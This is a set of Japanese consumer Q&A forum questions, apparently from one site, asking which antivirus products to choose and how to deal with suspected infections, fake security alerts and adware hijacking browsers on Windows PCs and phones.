検出力と安定性重視でお勧めのフリーのウイルス対策ソフトを教えて下さい。 （できれば日本語対応） 現在はavast!をWin7のＰＣ2台で利用していて、非常に満足していますが、 3台目のPC（Win7ｘ64）に何を入れるか迷っております。 avastでも良いのですがせっかくなので別のソフトを、 この際、良いソフトがあれば入れたいと思います。 私が過去に使った有名どころだと、 AVG…どうも検出力弱くて不安定（なぜか起動後ずっとHDDにガリガリ常に激しいアクセス） Avira…Askツールバーを入れないと検出力がかなりダウン（回避方法もかなり面倒） King…中国製で不安感が強く、その上、低いウイルス検出力、広告もうざい MSE…MS純正でOSとの相性、安定性は抜群ですが非常に低いウイルス検出力 と、私の使用経験ですと、どれもavastに比べて見劣りして… まぁavastも誤検出が多かったり完璧ではありませんが、 XP時代にはシャットダウンができないPC問題などもありましたし。 ただ最近のａｖａｓｔには非常に満足しています。 以上のことを踏まえお勧めのソフトがあればお勧め下さい。 上記の４ソフトはかなり昔に使っていたものもあるので、 最近は良くなっているのもあれば勧めて頂いても結構です。 （ここ半年以上は上記4ソフトの最新版は入れていません） よろしくお願い致します。
宜しくお願いします。 スマートフォンではサイト閲覧だけで感染といったことはないのでしょうか。
先ほどＰＣを開いたら　アップデートするようにとの表示が出ましたが　作業をするうちに　信頼する場所かどうか不明ですとの表示が出たので中断しました。 そのまま続行しても　問題はないのでしょうか？
家のパソコンがどうやらウイルス感染してしまったらしいです。 こんなことになるのは我が家で初めてのことなのでまず何をすれば良いのかがわかりません… 電源自体は付くのですがそこから何もできない状態になっています。 ウイルスは多分最近ネットでも話題になったInternet security　という木馬ウイルスのようです。
こんにちは。 先日中古のＰＣ（VAIO type G VGN-G3AAPSD）を購入しました。 ウィルス対策ソフトが入っていなかったのでウィルスバスタークラウドを入れようとしたのですが インターネットエクスプローラー７以上が入ってないのでインストールできないと出ました。 ＩＥをアップデートするにはネット接続をしなければならないのですが ウィルス対策が入ってない状態でネットに接続するのが怖いです。 ＩＥをアップデートするくらいなら接続しても大丈夫でしょうか？ ウィンドウズアップデートもまだしていないのですが ウィルス対策ソフトをインストールする前にしても大丈夫でしょうか？ よろしくお願い致します。
msn premium インターネットソフトウェア, と ウイルスバスターとの違いを教えてください。二つとも必要でしょうか。どちらか一方でよいのでしょうか？
最近、うちのデスクトップがインターポールのウイルスに感染してしまいました。色んなことが書いてある横に　「http://p.tl/r__Y」（画像）　のような請求ボックスみたいなのが出てきます。 色々調べて、F８からセーフモードとネットワークを選択して、ファイル名を指てして実行に iexplore http://www.spywarehelpcenter.com/remove このようなものをいれて実行すればおｋってこのページ⇒http://p.tl/iynx　に書いてあったんですが、ひとつ問題が起こりました。 セーフモードにしてから自分のアカウントにログインすると、一瞬真っ暗なページの周りに小さな白い文がいくつか出るような画面になって、その後１秒もしないうちに勝手にログオフとシャットダウンを始めてしまいます。（この状況の写真を添付しました。） シャットダウン後は勝手に再起動します。 わかりにくい説明かもしれませんがどうにかファイル指定のウインドウを開くところまでできるでしょうか？ あと、念のため僕が参考にした上のページが本当に良心的なサイトなのかもわかる範囲で教えていただけると助かります。
まずはご覧悦有り難う御座います。 取りあえずは、そのまま左上の矢印で戻りまして、その後に、スキャン掛けたらもう一度見たら出なかったのですが、、、、、、 これは、一体何なんでしょうか？　ウィルスほどの物でもなさそうですが、、、 取りあえず、珍しいのでスリッピングツールで切り取っておきました。 ただの、スキャンで消える物なのでしょうか？ それとも、そのサイトにただ貼り着いていた者でしょうか？ 教えて頂けませんか？ よろしくお願いします。
最近使用しているウイルバスタークラウドで 次のような脅威が度々検出されるようになり自動的に削除 されますが、その後IE10を起ち上げると決まって ホームページが「about:blank」に書換えられ、ディスクトップ に2個のdesktop.iniハァイルが生成され難儀しています。 このような問題を経験され、不具合を解消されたお方に 是非アドバイスをお願いいたします。 なを、当方PCはWin8がインストされています。 ウイルス/脅威:TROJ_GEN.R0CBOC0HU13 感染源:不正プログラム 影響を受けるファイル:C:¥Users¥toshio¥AppData¥Local¥Akamai¥installer_no_upload_silent.exe 処理:削除済み スキャンの種類:リアルタイムスキャン
windows7でウイルスバスタークラウド使用、ウイルスに感染しました。 ウイルスバスターの処理では、アクセスを拒否されましたと表示されています。 ウイルスは、Mal_MHTです。 削除したいのですが、方法を教えてください。
iPhone5を使ってます。 いつもGoogleで検索し見ていたサイトが このサイトはコンピュータに損害を与える可能性があります と表示されるようになってしまいました。 このサイトはコンピュータに損害が生じる可能性があります という警告文のページまで開いてしまったのですが大丈夫でしょうか？ またその警告文が出る前はサイトを閲覧していましたがその段階でウイルスなど感染する可能性はあるのでしょうか？
適当にサイト回ってたら、アバストがトロイの木馬をブロックしましたとかなりました、感染してたらどう対処すれば良いですか？？ネットに詳しい方いましたら教えてください！！！
現在avastをインストールしていますが競合しないようにインストールでき、ウイルス駆除率も高く日本語で分かりやすいフリーのおすすめのウイルス駆除ソフトはないでしょうか？ どなたか教えてください。よろしくお願いします。
こんにちは、 現在ウィルスバスターを使用してますが 更新間近でどうしようかと思っています。 つい最近同じような質問のタイトルを 見つけて読んでみたのですが・・ 途中で締め切られていたようなので＾＾； このままバスター更新か ESET Smart Security V6 ノートンか この三つあたりで決め兼ねています。 （比較サイトを散々見た結果絞りました） 優柔不断なのでこれのココがいいから コレにしときな的に言ってもらえると 助かります。 使用目的は インターネット ショッピング 動画 と、ありきたりですがこんな所です。 ※これ以外の余計な宣伝は必要ありません。 （余計迷うので・・） 因みにみなさんは何を基準に どれを使用してるのかも合わせてお聞きしたいです。 よろしくお願い致します。
インターネットを始めようとすると、突然次のようなメッセージが出てきて、フラッシュします。すーっとしています。これを止める方法はありますか？出てこないようにするには、どうすればよいでしょうか？メッセージは、「注意！お使いのパソコンの性能が低下しています。Windowsのエラーを直ちに修正してください。ダウンロード」。他にも、ウイルスソフトを購入するように、しつこく出てくるものもあります。最近では、Reg Clean Proとか。
ノートン360を使っています。 最近、ノートンでエラーメッセージが出ることがよくあり、今日はWindows起動時に添付のようなエラーメッセージが出ました。エラーメッセージは毎回違うような気はします。ノートン自体立ち上げてみても特に異常は確認出来ませんでした。解決方法をご存じでしたらぜひアドバイスお願いします。
すみません。かなり慌てています。 PDF作成ソフトを無料ダウンロードしたつもりが、怪しいウィルスの疑いのあるものをインストールしてしまいました。うかつにもウィルススキャンソフトをいれていなかったのが悔やまれます。今からウィルス対策ソフトをいれて駆除する。というのでも大丈夫ですか。今日はわけあって作業できないため、とりあえずシャットダウンしました。よろしくお願いします。
Deltaの検索ページがしつこく表れて消えません。 あちこちサイトを拝見して色々試し、起動時のタブは希望のページに戻りましたが、 新しいタブを開くと必ずDeltaSearchのページになります。 設定の画面には起動時、ホームページともにDeltaは入っていません。 拡張機能にもDeltaは入っていません。 2度クロームをインストールし直しましたがダメでした。 設定の項目にDeltaらしきものが見当たらず、プログラムと機能（アンインストール）にもそれらしきものは見当たりません。 特に何かインストールをしたわけでもなく、突然始まりました。 アドバイス頂ければ有難いです。
ウィルスメールのプロパティを表示すると　感染する恐れはあるのでしょうか？ ネットでも検索しましたが　2010年程度までの回答では　まず感染する恐れはない との事であったのですがこのような内容は日々変わっているため質問させて頂きます。 以下の環境　操作で何かしら危険性はありますでしょうか？ 操作内容： 気になったメールがあったのでOutlook マウス右クリックでプロパティ表示 デスクトップにコピーし　ウィルススキャン →TROJ_FAKEAV検出　AVソフトにて削除 元メールも削除 環境： OS: Windows7 パッチ類は常に最新適用 Mail: Outlook2007 AV Soft: ウィルスバスタークラウド 以上よろしくお願いいたします。
SSLによる通信では入力情報が第三者に読み取られる危険性はないのですか？
PCを起動しただけで、英語の広告みたいな音声が繰り返しなるのですが、 ウイルスでしょうか？ ウイルスだったら、対処方法を教えて下さい。 ランケーブルを外すとちょっとしてから消えます。 ウイルスチェックには引っ掛かりません。
スマホ用のセキュリティソフトでお薦めはありますか。OSはAndroidを考えています。友人からはコスト的にもウィルスバスターがいいとも言われましたが、他にお薦めはありますか。コストとセキュリティ度双方から見てアドバイスお願いします。
現在「ウイルスバスタークラウド」を使用していますが、更新を機に「ESET Smart Security V6」にしてみようと考えています。ただ、周囲に使用している人間がいないので、不安があります。 使用状況は ・動画観覧 ・ネット観覧 ・転職サイト観覧・登録 ・楽天でのネットショッピング ・ホテル・旅行の予約 ・遊び程度での株取引 ・SNS等はやらない ・PC初心者 今まで「ウイルスバスタークラウド」で問題は起きたことはないが、「ESET Smart Security V6」は“軽い”し“未知のウイルスにも強い”とネット上での評価も高いし、値段も多少は安いので気になります。 皆さんおオススメはどちらですか？
家族のも合わせてパソコンが3台あり、セキュリティ・ウイルスソフトを「ウイルスバスタークラウド3年・3台版」にしようと考えています。 そこで疑問点が。 3年という期間は何時から計算されるのですか？ それぞれのパソコンに入れた日からなんですか？例えば… 1台目には2100年1月1に入れたら2102年12月31日まで有効。 2台目には2100年7月1日に入れたら2013年6月31日まで有効。 と、各パソコンに入れた日からの計算でいいんですか？ ご教示願います。
コンピューターウイルスって、プログラミングができる人が、作っているんですか？ あと、コンピューターウイルスを作っている人って、優秀な人が多いんですか？
PCのネットを使用し、履歴を見ると 勝手にあるサイト（http://ad.helpertrack.com/?16390←?以降の数字は不規則）に次々と接続されているようです。履歴が次々と増えていきます。 そしてのそのサイトを経由して違うサイトも接続しているような・・・。 特に怪しいものをダウンロードした覚えはないのですが・・・。 PC初心者のため、詳しくはわかりませんが、どなたか助けて頂けないでしょうか？ 使用しているPCはXPです。 ネットがとても遅く感じますが、PCの使用ができないなどのトラブルはありません。 「ウィルスセキュリティ・ZERO」でウィルス検査などはしてみましたが、よくわかりません。 どうぞよろしくお願いします。
以前、総合セキュリティソフトとプラスアルファで組み合わせるソフトについて、 質問をしたものです。 ttp://oshiete.goo.ne.jp/qa/8146289.html たくさんの方からのアドバイスをいただき、 私なりの結論として、総合セキュリティソフト（ノートンインターネットセキュリティ）のみにして、 その他のスパイウエア対策ソフトはアンインストールしました。 その後、ノートンでスキャンをすると、クッキーが１０個以上は検出されます。 今まで、スパイウエアブラスターやスパイボット、アドウェアなどが入っていた時は、 スキャンをしても、クッキーはせいぜい２、３個しか検出されませんでした。 スパイウエア対策ソフトが、弾いてくれていたのでしょうか？？？ ○こういう状態であっても、総合セキュリティソフトのみの方がよいでしょうか？ 皆さまのお考え等をアドバイスいただけると、ありがたいです。よろしくお願いいたします。
お勧めのウイルスソフトは何でしょうか？ 今まで、「ウイルスバスター」を１０年以上使ってきました、 (1) 「ノートン」、「マカフィー」等ありますが、 「ノートン」なんかは「３６０」とか色々とあります？？？ 「ウイルスバスター　クラウド」は重たい、と聞きました・・・ ただ、「安い」が魅力でした、「ヤフオク」などで「海外版」は「３年版　３ＰＣ」で２５００円位です、 もちろん、「日本語」に変換できます。 如何でしょうか？
ｗindowsセキュリティセンター画面で、マルウェア（ウィルス）対策が「見つかりません」と表示されています。「プログラムの検索」をクリックすると、「 Internet Explorer ではこのページは表示できません」と表示されます。また、無料ソフトをダウンロードしようと思い、microsoft safety scannerにネットでアクセスしようとしても、「Internet Explorer では www.microsoft.com に接続できませんでした」というメッセージが出て、アクセスできません（もう一度読み込んでください、と出ますが、何度やってもダメです）。すでにウィルス感染して、このようなアクセスを妨害しているのでしょうか？ パソコンを正常化し、かつ、今後の対策としてウィルス対策ソフト（無料）をダウンロードする方法はありますか？また、有料のソフトなりを購入した方がベターなのでしょうか？ 私はパソコン大不得意で、ネット閲覧やメールくらいしか使えないど素人です。 お手数ですがどなたかアドバイスください。 パソコンはNECのLL750/Lで、2008年に買いました。VISTAだと思います。
昨日の夜いつも通りにPCに電源を入れてNECのロゴが映って・・・・・・・までは良かったがその先動かず勝手にシャットダウン・・・・これを２度３度繰り返し暑いから馬鹿になったのか？と思い数十分電源切って放置したら普通に起動！パスワード入力してスタート画面に行ってデスクトップに行って作業を開始しようとしたらタスクバーのとこに表示されるウイルスバスタークラウドが待っても待っても保護されずアクションセンターのフラッグに赤い×が出てて重要なメッセージ２件表示されててセキリュティの有効無効の確認とネットワークファイアウォールとウイルスバスタークラウドの有効無効の設定を弄ってなんとかもとに戻ってPCの電源を入れたときもロゴでシャットダウンせず順調に動いてるんですけどなんで勝手にセキリュティが無効になったんでしょう？？ なんでウイルスバスタークラウドをダブルクリックしても開かなかったんでしょう？ 契約も2014までなのに アクションセンターのセキリュティのとこが赤でPCは危険な状態とか出て個人的にウイルスか？と思ったんですけど・・・　　クラウドを破って侵入した・・・・ あとトロイの木馬をPCが勝手にスキャンするときあるんですけど・・・コイツなんですかね？ 因みにウイルスバスタークラウドのWebの脅威は６件です前は９件でした・・・・ PCじたい別にへんなことしてないし取り扱いも乱暴にしてないし購入半年で電源入れてロゴでシャットダウンはおかしいですよね？ NEC LaVie Windows８　PC-LE150JSP2
セキュリティーのソフトが怪しいものを検地し実行させました その後　終了し　昼から立ち上げようとスイツチいれ　パスワード入れる画面で　カーソルは点滅しますが　キーをたたいてもまったく　文字数字　入りません 只　スクリーンキーボードにすると　できます でも　エクセル　インターネットの画面で　全く　文字入力できません とても困ってます 対処法　宜しくお願いします
フレッツウイルスクリアを利用しているものです。 昨日あたりから突然、 「守りたい情報の送信を中断しました。＜銀行口座＞」 と表示されます。 インターネット接続しているときは、URLに含まれる数字なども反応すると聞いたので 誤検知なのかな、と思っていました。 ですが、外付けHDDからデスクトップにファイルをコピーしたときも 同じ内容の警告が表示されました。 その後は再びコピーしても表示されませんでしたが・・・ ウイルスを疑い、クイックスキャンやフルスキャンをしてみましたが、 全く検出されません。 リカバリー以外で解決する方法はあるでしょうか。 また、どこに情報を送信しようとしているか調べることはできますか。
windowsがゲストアカウントではアプリをインストールできない構造になってる、iPadはアプリのインストールが特定の手段を使わなければ実行できない構造になっているそうですが、それを無視してソフトをインストールできる手段が「脆弱性」と呼ばれているって解釈であってますか？ ｉｐａｄのiOSやsafariにはwindowsでよくある「任意のコードを実行」の脆弱性はないんですか？ なぜｉｐａｄでは「偽ウイルスソフト」や「偽メインテナンスソフト」の被害がほぼ報告されてないのか教えてください。 iPadがウイルスに強いのはなぜでしょうか？
パソコン初心者です。 このごろ、パソコンが重くなってきています。 ウイルスバスタークラウドを使っているのですが、ここ１か月あたりからweb脅威が、増えてきました。 今では、７０件以上までなっていて、不安になってきました。 検出されたものは、 ad.yieldmanager.com go.com revsci.net doubleclick.net advertising.com serving-sys.com zedo.com などが主に出てきます。 すべて削除済みになっています。 上のファイルは、いったい、どのようなものなのでしょうか？ ウイルスや、スパイウェアの可能性はあるのでしょうか？ どのような対処をすればいいのでしょうか？ ちなみに、少し前からペアレンタルコントロールのチェックを、少し増やしました。（ウェブ広告・ゲームなど）
現在、Googleのネクサス７を使っているのですか、そのなかにpcウイルスと同じ名前の[Who am I]という アプリがありました。設定のアプリ管理画面では確認できずウイルス対策ソフトから見つけました。 また、アンインストールもできません。対策ソフト自身はウイルスとは認識しないのですが、 名前が名前なので不安です。誰か回答お願いします。
息子が勝手に触って・・・ ユーチューブか何かを見たらしいのですが・・・ 画面に何か出るようになりました。 何を意味しているのですか？
１．メジャーなサイトを閲覧していてウイルスに感染しても、その時は被害者の数が絶対的に多いから、たとえ観戦で知らずのうちに加害者になったとしても自分が責任を問われる可能性は極めて低い。 ２．遠隔操作逮捕事件はマイナーサイトにアクセスしたために起きた事故。 ３．絶対に感染しない対策ソフトなどいまだ存在しない。有料でも遠隔操作事件のように新種への感染を防ぐ能力はなくて、古いウイルスに対しても防護率は100パーに届かない。 個人利用で、メールやオフィスソフトを利用せず、ネット利用時は非常にアクセス数の多い有名サイトしか見ず、銀行や買い物サイトなどカード情報やお金を扱う重要なサイトにはそのPCからログインしない、時、有料ソフトを使用する必然性はありますか？123のどこかに誤りはありますか？
ノートンインターネットセキュリティ2012を使ってます。 Firefox23でグーグルから検索すると検索結果に安全マークが表示されません。 ヤフーで検索すると安全マークが表示されます。 ノートンの更新は最新にしています。 どなたか原因がお分かりになるかたがいらっしゃいましたら よろしくお願いいたします。
png画像には脆弱性があると知り、それを知ってからなるべく開かずに これまできたのですが、最近気が緩みふとgoogle類似画像検索を使用したとき、 参照先にpngを置いてしまい、サイトを通してですが表示してしまいました この場合直接画像を開いた時と同じ状況になるのでしょうか？ それともサイトを通しているので直接表示扱いにならず、 その画像がもし悪意あるものでも感染しないのでしょうか？ そしてpngの脆弱性を利用したウイルス感染は ウイルスセキュリティソフトで駆除できるのでしょうか？ 使用OSは７　ブラウザはgoogle chrome　 ウイルスセキュリティはカスペルスキー2013です 回答よろしくお願い致します。
＞P2P向けの国産ウイルス(Antinnyなど)による情報流出騒動がたびたびメディアなんかで報道されてますが、2002年当時としては非常に珍しかったらしい日本産ウイルス。「お手軽ウイルスプログラミング」ではホントーに困ります。 http://lhsp.s206.xrea.com/hsp_tips8.html の「「お手軽ウイルスプログラミング」ではホントーに困ります。」とはどういう意味でしょうか？ 2002年に珍しかった国産ウイルスが、プログラミングとどう関係ありますか？
リセットとは、　http://www.atmarkit.co.jp/ait/articles/1211/15/n …　の、すべてを削除してwindowsを再インストールする、という機能です。これを使って初期化するとライセンス認証(アクティベーション)は維持されています。ということはこの機能を利用して初期化する場合、システムディスクはフォーマットされてない可能性が高いと思うのですが安全性に問題はないのでしょうか？windows8利用経験のある方に質問です。この機能の使用でシステムドライブのウイルスはきれいさっぱり消えますか？OSのDVDを使って新規インストール(ライセンス認証をもう一度行う必要あり)する場合とセキュリティリスクに差はありますか？
以前DTM関連で登録したメールアドレス（その後pcにトラブルが起こり初期化したので現在使用してるメアドは別のもの）をもう一度開きたくログインしようと思ったのですがパスワードを忘れてしまい以前のメアドを入力したのですがこのメールアドレスでのアカウントは存在いたしませんと表記がでてしまいますがgoogleアカウント新規作成でこのメールアドレスを入力すると既に別のユーザーが使用していますとなりどうにもわからない状態です。どうすればよいでしょう？
以前は、なかったのですが最近、ネットで動画を見ていると頻繁に「パソコンがウィルスに感染しています」だとか「パソコンをいますぐ修復するなら　OK　をクリック」だとか警告画面らしきものがチカチカと点滅を繰り返して表示され目障りで仕方ありません。これは本当にパソコンが感染して対処が必要なのか単なる広告なのか、もし広告なら設定で表示させない方法があるのでしょうか？。
どこかに　トロイの木馬が含まれたファイルがあるかもしれないという場合、フォルダー全体を圧縮すると　どうなるでしょうか。　その圧縮されたフォルダーの中に　トロイの木馬が含まれている場合、その動作を抑制できるでしょうか。　　さらに、その圧縮フォルダーに　パスワードをつけた場合、どうなるでしょうか。　そうした場合、クラッカーは　トロイの木馬と交信しづらくなるでしょうか。。
たとえばIPアドレスが知られただけで そのIPアドレスをもとに パソコンに侵入されて中身を見られたり ウイルスを送り付けられるということは有り得るのでしょうか？ もちろんネットに接続してる時の話です。
以前ノートンはインストール途中にブルースクリーンが出たのでそれ以外で。カスペルスキーはメールの受信が極端に遅くなったのでこれも却下で。 できれば４年以上長期にわたって同じソフトを使い続け、その間リカバリーやシステムバックアップからの復元を行ってない方の回答が希望です。 優先順位は安定＞速度＞セキュリティ、です。 無料でも有料でも構いません。安定して動作するソフトの名前を教えてください。
詳しくは書けないのですが 最近、私のパソコンの中身を知らないと絶対わからないことをある人物が言っていました。 その後、ウイルス検索ソフトで検索しましたが、ウイルスは出てきませんでした。 しかしまだ不安なのでルータのファイアーウォールを最高レベルに設定しました。 まだ何か不安感があるのですが 何か他にこれをチェックして問題がなければ、見られてる心配は無いといったものは無いでしょうか？
パソコンがウイルスに感染しました。 突然前にパソコンをつけたら、インターネットにつなげる時のホームページが変わっていました。 妹が変えたのだろうと思い、気にせずヤフーなどを使用していたのですが 突然パソコンがインターネットに繋がらなくなりました。 父が、ウイルスソフトのせいだと私をしかりソフトを全て消せと起こりました。 ぶっちゃけ私はそのときパソコンに触れてもいなかったので怒りましたが、取り合ってくれずよくわからないままに私がなんとかするハメになりました。 父は中途半端にパソコンに詳しいのでウイルスソフト消しとけと言われとりあえずソフト大半をけすと、常時ホームページがヤフーに戻ったのですがそれから次の日まったくインターネットにすら繋がらなくなりました。 どうしたらウイルスを消してインターネットに繋がるのでしょうか？ ちなみに復元？みたいなので戻そうかと思ったのですが、いつ感染したのかすらわからず去年のことかもしれないので無理でした。
いくらスクリーンセーバーを起動しても一瞬で解除されるようになり、メモ帳を開いて放置していたら「えええええええええええええ」とゆっくり入力されたり、高速で入力されたりしてました。 ネットをする度に今まではクッキー監視ウェアが10個近く検出されてたのに急に検出されなくなったり、クッキーでパスワードが保存できなくなったり(Chromeの不具合かも)、 ログオン画面にしていたら勝手にパスワードが入力されていた形跡があったり、 他にも不自然な点が多々ありました。 キーボードを挿し直してみましたが変化なしです。 あまり詳しくは言えないのですが、こういう状態になる数日前、警察や隣の国の人達が隠蔽したがっていた事件に関わっていました。 もしかして国の関係者に遠隔操作ウイルスを入れられてしまったのではないかと不安で仕方ありません。 証拠もなしに遠隔操作で強制逮捕された人も居るので…。 ただキーボードが寿命なんでしょうか？同じ症状が出た人居ませんか？
ウイルスバスタークラウドを買ったのですが ユーザー登録で名前や住所なども入力しないといけないようなのです。 自分としては不安なのでパソコンに本名や住所などのデータを残しておきたくないのです。 そこでマカフィーというウイルスソフトが評判よかったので 買おうと思っているのですがこれも同じようにユーザー登録で住所などの入力を求められるのでしょうか？
最近セキュリティについて考えていて 調べているとファイヤーウォールというものを設定しておいたほうがいいと書かれていたので 自分の使っているCTUのファイヤーウォールの設定を見てみると レベル低 が WAN側からのウェルノンポート以外の通信は全て許可 レベル高 が WAN側（外部）からの全ての通信を遮断 となっていて 初期設定はレベル低となって セキュリティを考えてレベル高に変更したいのですが WAN側（外部）からの全ての通信を遮断 というのは具体的にどういうことが自分側では出来なくなってしまうのでしょうか？ あと高に設定しておくと安全性は全く違うのでしょうか？ ネットやファイヤーウォールについて詳しくないのでよろしくお願いします。
PCを起動するたびに Afyvekemzyfubgut.exe　-　ディスクがありません ドライブにディスクがありません。ディスクをドライブ￥Device￥harddisk5￥DR1に挿入してください。 とエラーが出て何をしても消えません。 ウィルスチェックをしましたが何も検出されず、PCにもそこまで詳しくなくお手上げ状態です。 心当たりとしては少し前に別のユーザーでSkypeを使ってた時にウィルスが送られてきて、ウィンドウが増え続けるというものがありまして、それは新規ユーザーを作って事なきを得たんですが、またそっちのユーザーに入ったら今度はどのユーザーにしてもエラーが出るようになってしまいました。 解決策、または解決法が書かれているサイト等がありましたら教えていただければと思います。 非常に読みにくいものとなってしまいましたが、よろしくお願いします。
なぜWebサイトを開いただけで感染に至ることがあるのでしょうか？ 仕組みがまったくわかりません。 宜しくお願いします。
余計なセキュリティを入れないディフェンダーのみのwindows8のセキュリティレベルは、MSEだけを入れたwindows7以前のOSと完全に同等ですか？
最近、ネットの画面を開いていると突然警告メッセージが出るのですが 初めのうちは本当のマイクロソフトからの連絡だろうかと思っていましたが 意味がわからないので無視をしていました。 すると最近ではFlash　Playerに問題があるとか、PCのパフォーマンスに不備があるとなんとかで とにかくここをクリック的なメッセージが画面に表示されます。 むやみにクリックするのは絶対に良くないと思って無視してるのですが 何が原因なのでしょうか？何かのウィルスに感染したのでしょうか？ ちなみにセキュリティーソフトはノートンの360というのをいれていますし、 あまり訳のわからないサイトは行かないようにしています。 対処方法を教えていただけませんか？ よろしくお願いします。
ノートンを延長しようとプロダクトキーを入力しましが、「ブラウザを起動できませんでした」というメッセージが出て延長できません。 どうすればブラウザを起動できますか？ OSはWindows7を使ってます。バージョンはどこで見ればいいかわからないので不明です。
いつもここで回答を寄せられている方々に質問です。 現在ではウイルスの自動解析システムが進んでいて、ほとんど自動解析だそうです。手動解析は一部に限られるそうです。ご存知でしたでしょうか？ それともう一点。 オンラインの動的解析サービスがあるのをご存じでしたでしょうか？ 一例： https://malwr.com/submission/ ほかにもThreatExpert等々いくつかあります。ご存じでしたか？また、利用されたことはありますか？
インターネットに繋ぐとmajority-batchというサイトの広告表示が必ず出てきます。 これを表示させなくする方法がお分かりの方がいれば教えて下さい。
tuto4pc_jp_11というプログラムが、所構わず割り込みを掛けてきて、画面上に大きな警告メッセージを点滅表示します。応答すると、勝手にサイトに誘導します。何度アンインストールしても、いつの間にかゾンビのように復活します。こいつの駆除方法をご存知の方、方法を教えてください。
アンチウィルスソフトとして、フリーの「Avira」を利用しています。 また、アンチスパイソフトとして、フリーの「Spybod」を利用しています。 そして私は趣味で海外のサイトをよく見るので、週に一回は必ずSpybotでスキャンをします。 すると、Aviraで常駐保護をしているはずなのに、いくつものスパイウェアが発見されます。 そこで質問なのですが…… Aviraなどのアンチウィルスソフトでは、スパイウェアをブロックできないのでしょうか？ それともか、何かしらの理由で常駐保護が機能していない、はたまた実は設定されていないのでしょうか？ あるいは、Aviraの性能がお粗末なのか、Spybotが無関係のファイルを感知しているのか……。 なにぶん、私はウィルスとスパイウェアの違いもはっきりと分かっていない素人ですので、よろしくお願い致します。
フリーソフトをダウンロードした際、ＰＣの動きを高速化する・・・と言うＲｅｇＣｌｅａｎＰｒｏというサイトが一緒に出てきました。ノートンでセキュリティをかけているので、安全なものと思い一度ダウンロードのボタンを押してしまいましたが、その後高速化するのに料金が発生する事がわかり、アンインストールをしたのですが、その後、インターネットに繋ぐ度、RegCleanProが立ち上がり困っています。 コントロールパネルを見てもRegCleanProはアンインストール済みらしく、表示はありません。 どうすれば、このサイトが出て来なくできるのでしょうか？ ノートンでウィルス除去する方法があるのでしょか？
パソコン内に暗号化されたファイルがあり、その状況でパソコンがマルウェアに感染するとします。 そのマルウェアが[暗号化されたファイルの中身の一部または全部を変える、悪意のあるコードまたはファイルを付加する] こういうことは出来るのか、ご教授ください。 出来るのならば、暗号を解除しようとすると、どのようなことが起こるのでしょうか。 ○解除に失敗するので、そのファイルは永久に使えなくなる ○変えられた通りの内容のファイルになっている。 中身の一部を変えられると、解除後は、中身を変えられた部分と変わっていないそれ以外の部分で構成されるファイルになっている。変えられた部分が悪意のあるコードだと、解除後のファイルを開くとそのコードが実行される。 全部を変えられると解除後はすべて変えられたファイルになっている(エクセルファイルが全く別の悪意のある実行ファイルになっている等) ○付加された悪意のあるコードまたはファイルがそのまま残り、解除後のファイルは(元のファイル＋悪意のあるコードまたはファイル)という構成になる。解除後のファイルを開くと、その付加されたコードまたは付加されたファイルが実行される。
こんにちは。 ウイルスチェック機能が付いたUSBを挿すと 毎回、ファイルを隔離したという警告がでます。 ファイルは以下です。 viruscleaner.vbe autorun.inf USBを挿した時に、何らかの原因で上記ファイルをUSBにコピーしているのを 確認しました。 ウイルスでは？と思い調べたのですが、 autorun.infは良く操作されやすいとあったのですが、 viruscleaner.vbeが全く情報がなく分かりません。 そこで、 ウイルスソフトでviruscleaner.vbeを駆除してPCを再起動したところ、 今度は、『ファイルが見つかりません。C:\windows\system32\viruscleaner.vbe』 というエラーメッセージがでるようになりました。 （USBは挿しても上記のような現象はなくなった） 何らかがviruscleaner.vbeを起動？しているようですが、 これを特定することはできるのでしょうか？ 何か良い解決法がありましたら、ご教授をお願いいたします。 OS：Win XP(SP3) 常駐ウイルスソフト：なし（会社方針。。。） 今回使用したウイルスソフト：Microsoft Safety Scanner よろしくお願いいたしますm(_ _)m
これまでウイルス対策として、NTTのフレッツウイルスクリアを利用していましたが、 解約に伴い新たに別のウイルスソフトの導入をしなければなりません。 どのウイルスソフトが良いのか分かりませんが、ESETの評判が良かったのでESETの購入を検討しているのですが、 ・ESET パーソナル セキュリティ ・ESET NOD32アンチウイルス の二種類があり、どちらを購入すればよいのか分かりません。 ESETをご利用されている方、また、こういった分野に明るい方、教えて下さい。
ブログのソースを使ってホームページを作りたいのですが削除するコードとかで難しいですか？ブログだとサーバの管理内ですし・・・・・・・
状況は以下のとおりで、yahoo知恵袋の質問者と状況は全く同じものです。→ (元)http://detail.chiebukuro.yahoo.co.jp/qa/question … １．プログラムのアンインストールをしようとしましたが、すべてのプログラムの中にQvo6が存在しません。 ２．ＣドライブのProgram Files にQvo6のフォルダが存在しません。 ３．ツール→アドオンの管理でQvo6を無効にし、インターネットオプションの全般でホームページをYahooに設定し直しましたが、またQvo6で立ち上がってしまいます。 また、回答者の言ったとおり、システムの復元をしようとしたところ、「コンピュータのシステムディスクに復元ポイントが作成されていません。復元ポイントの作成をするにはシステムの保護を開いてください」と出ます。 ここで、質問なのですが復元ポイントの作成を今からしたところで手遅れなのではないでしょうか。質問の回答と、解決策、よろしくお願いします。
メモリー上に存在しているマルウェアはパソコンの電源を落としても パソコンのアダプターをコンセントに差し込んだままにしていると消滅せず残っているのでしょうか？
地デジテレビやレコーダーってＬＡＮでネット接続して、 投票したりする視聴者参加ができたり、テレビ番組や検索の情報を入手したりと いろいろできると思うのですが、今までネット接続していません。 それは、ウイルスやセキュリティーに不安があるからです。 パソコンには個々にセキュリティーソフトを入れていますので、回線のセキュリティーは契約していませんし、アテにもしていません。 でも、最近スマホでもウイルス対策ソフトを・・・なんて声もあります。 テレビやレコーダーで個人情報もないとは思いますが、 なんらかの情報漏洩もありえる話かと思うのです。 また、回線会社でセキュリティーの契約をしていないので、 武装しているパソコンではない、テレビなどはウイルスの脅威にさらされており、 気付かないうちにウイルスによるなんらかのトラブルになるやもという気がします。 皆さん、その辺のネット接続はどうされているのでしょうか。
ほぼＰＣ初心者です。 ノートンアンチウィルス2013の購入を検討しています。 現在ノートンアンチウィルス2012を使っています。 日本語版と英語版だと表示が英語だけですか？ 中国版は、評判が悪いのでやめておこうと思います。 下記のように３ＰＣ1年で値段が日本語版は、倍なのです。 スキャンとliveupdateぐらいなので表示が英語でも問題ないと思うのですが。 それは、甘い考えですか？ Norton Antivirus 2013 [Latest Version] - 1 User / 3 PC (English Version) (英語版) 価格：￥ 1,980 通常配送無料 http://www.amazon.co.jp/Norton-Antivirus-2013-La … NORTON ANTIVIRUS (2013年 日本語・正規版） 価格：￥ 3,749 通常配送無料 http://www.amazon.co.jp/%E3%82%B7%E3%83%9E%E3%83 …
